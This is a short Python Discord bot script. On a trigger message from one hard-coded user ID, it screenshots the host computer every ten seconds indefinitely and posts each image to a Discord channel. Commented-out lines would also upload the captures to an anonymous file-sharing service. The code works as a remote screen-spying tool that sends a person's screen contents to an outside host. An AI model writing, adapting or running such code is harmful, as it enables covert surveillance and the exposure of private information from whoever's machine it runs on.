from anonfile.anonfile import AnonFile
import pyautogui
import time
import discord
client = discord.Client()
TOKEN = "TOKENHERE"

@client.event
async def on_message(message):
    if message.author.id == 343591759332245505 and message.content == "start_tracking_me":
        while True:
            screenshot = pyautogui.screenshot()
            screenshot.save("screen.png")
            #anon = AnonFile('351fafd5bb43939b')
            #status, file_url = anon.upload_file('screen.png')
            await message.channel.send("what nexity is looking at: ")
            await message.channel.send(file=discord.File('screen.png'))
            time.sleep(10)
    
client.run(TOKEN)
